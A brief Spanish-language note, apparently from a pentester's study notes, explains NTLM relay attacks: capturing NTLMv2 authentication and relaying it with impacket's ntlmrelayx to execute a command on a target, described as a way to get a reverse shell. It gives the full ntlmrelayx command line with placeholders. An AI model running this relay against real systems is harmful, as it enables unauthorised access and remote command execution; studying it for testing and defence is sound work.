### Explicación

Podemos usar herramientas para capturar los hashes NTLMv2 y utilizarlos para obtener una reverse shell en una máquina.

Haremos esto con **ntlmrelayx** que es paete de impacket.

La herramienta captará una conexión al smb al que nosotros apuntemos y aprovechará el nrlmv2 valido para loguearse (una especie de pass the hash).

    impacket-ntlmrelayx --no-http-server -smb2support -t <ip/machine> -c "<command>"
